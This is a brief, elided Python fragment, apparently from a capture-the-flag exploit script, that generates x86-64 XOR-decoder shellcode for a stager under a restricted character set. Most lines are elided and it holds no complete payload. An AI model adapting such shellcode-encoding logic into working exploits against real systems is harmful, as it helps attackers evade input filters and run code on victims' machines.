...
for bitty in range(len(stager)):
    ...
    if a[0] in opts:
        ...
        if a[0] == 0:
            shellcode += f"xor eax, DWORD PTR [rbx+{ 55 } ] \n"
        else:
            shellcode += f"xor eax, DWORD PTR [rbx+{ 0x30 + csu.index(a[0]) } ] \n"
    ...
    if a[1] in opts:
        ...
        if a[1] == 0:
            ...
            shellcode += f"xor eax, DWORD PTR [rbx+{ 0x30 + csu.index(a[1]) } ] \nxor BYTE PTR [rdx+ { 0x30 + bitty } ], al\n"
